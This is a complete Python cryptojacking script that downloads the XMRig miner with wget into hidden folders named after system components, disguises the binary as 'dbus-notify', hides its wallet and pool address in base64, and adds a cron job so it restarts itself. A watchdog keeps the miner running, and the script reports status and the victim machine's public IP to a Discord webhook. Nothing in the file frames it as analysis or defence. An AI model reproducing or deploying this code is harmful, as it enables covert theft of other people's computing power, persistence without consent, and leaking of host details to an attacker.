import os, subprocess, time, socket, threading, requests, base64, shutil

# === CONFIG (obfuscated) ===
WALLET = base64.b64decode("TVJDVUxFMm1rR0tIc0hSZ2l1SDVERlF3Q0NPZDZLZ2JIOHNuclN3M3pHUmU1dUpmNW1SRVVmS0c5a3A2dmlZQVp6b29EaWtKaVRIbmtObGxZaTNQYW9vOVp0cnpYSFJRMTlaMm8=").decode()
POOL = base64.b64decode("c2UubXJjdWxlLnVyZWJ6dmFyZWYucGJ6OjExMjM=").decode()
COIN = "zeph"
THREADS = "4"
RIG_ID = "sysd0"
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/xxxxxxxxxx"

# === PATHS ===
MAIN_DIR = os.path.expanduser("~/.cache/.X11-unix")
FALLBACK_DIR = os.path.expanduser("~/.local/share/.syslogd")
MINER_NAME = "dbus-notify"
MINER_BIN = os.path.join(MAIN_DIR, MINER_NAME)
LOGFILE = os.path.join(MAIN_DIR, "syslog.txt")
SCRIPT_PATH = os.path.abspath(__file__)
status = {"running": False, "start_time": None}

def run_cmd(cmd):
    try: return subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL).decode()
    except: return ""

def send_discord(msg):
    try: requests.post(DISCORD_WEBHOOK, json={"content": msg})
    except: pass

def fix_path():
    # Kill any readonly/broken dbus-notify
    if os.path.isdir(MINER_BIN):
        try: shutil.rmtree(MINER_BIN)
        except: pass
    elif os.path.isfile(MINER_BIN):
        try: os.chmod(MINER_BIN, 0o700)
        except:
            try: os.remove(MINER_BIN)
            except: pass
    os.makedirs(MAIN_DIR, exist_ok=True)

def fallback_path():
    os.makedirs(FALLBACK_DIR, exist_ok=True)
    return os.path.join(FALLBACK_DIR, MINER_NAME)

def install_miner():
    try:
        fix_path()
        archive = os.path.join(MAIN_DIR, "xmr.tar.gz")
        url = "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"
        run_cmd(f"wget -qO {archive} {url}")
        run_cmd(f"tar -xf {archive} -C {MAIN_DIR}")
        for f in os.listdir(MAIN_DIR):
            path = os.path.join(MAIN_DIR, f)
            if "xmrig" in f and os.access(path, os.X_OK):
                try: os.rename(path, MINER_BIN)
                except: shutil.copy2(path, fallback_path())
        os.chmod(MINER_BIN, 0o700)
    except Exception as e:
        send_discord(f"❌ Install error: {e}")

def start_miner():
    if not status["running"]:
        install_miner()
        if not os.path.isfile(MINER_BIN) or not os.access(MINER_BIN, os.X_OK):
            send_discord("⚠️ Using fallback miner path.")
            miner = fallback_path()
        else:
            miner = MINER_BIN
        cmd = f'{miner} -o {POOL} -u {WALLET} -p x -a rx/0 --coin {COIN} -t {THREADS} --tls --rig-id {RIG_ID} --donate-level=1'
        with open(LOGFILE, "a") as log:
            subprocess.Popen(cmd.split(), stdout=log, stderr=log)
        status["running"] = True
        status["start_time"] = time.time()
        send_discord(f"✅ Miner started\n{get_status()}")

def stop_miner():
    run_cmd(f"pkill -f {MINER_NAME}")
    status["running"] = False
    status["start_time"] = None
    send_discord("🛑 Miner stopped.")

def get_status():
    uptime = int(time.time() - status["start_time"]) if status["start_time"] else 0
    try: ip = requests.get("https://api.ipify.org").text.strip()
    except: ip = "?"
    return f"💠 Miner: {'✅ Running' if status['running'] else '❌ Stopped'}\nIP: {ip}\nUptime: {uptime//60}m\nThreads: {THREADS}"

def get_hashrate():
    try:
        out = run_cmd(f"tail -n 50 {LOGFILE}")
        for line in out.splitlines()[::-1]:
            if "speed" in line.lower():
                return line.strip()
        return "No rate yet."
    except:
        return "❓"

def setup_cron():
    cronline = f"*/3 * * * * pgrep -f {SCRIPT_PATH} > /dev/null || python3 {SCRIPT_PATH} &"
    croncmd = f'(crontab -l 2>/dev/null; echo "{cronline}") | sort | uniq | crontab -'
    run_cmd(croncmd)

def watchdog():
    while True:
        time.sleep(10)
        if status["running"]:
            if not run_cmd(f"pgrep -f {MINER_NAME}").strip():
                start_miner()

def self_guard():
    try:
        import psutil
        me = os.path.abspath(__file__)
        for p in psutil.process_iter(['pid', 'cmdline']):
            try:
                if p.pid != os.getpid() and me in ' '.join(p.cmdline()):
                    exit()
            except:
                pass
    except:
        send_discord("❌ Missing module: psutil")

def main():
    try:
        self_guard()
        setup_cron()
        threading.Thread(target=watchdog, daemon=True).start()
        start_miner()
        while True:
            time.sleep(1800)
            send_discord(f"⏳ Alive: {get_hashrate()}")
    except Exception as e:
        send_discord(f"❌ Crash: {str(e)}")

if __name__ == "__main__":
    main()
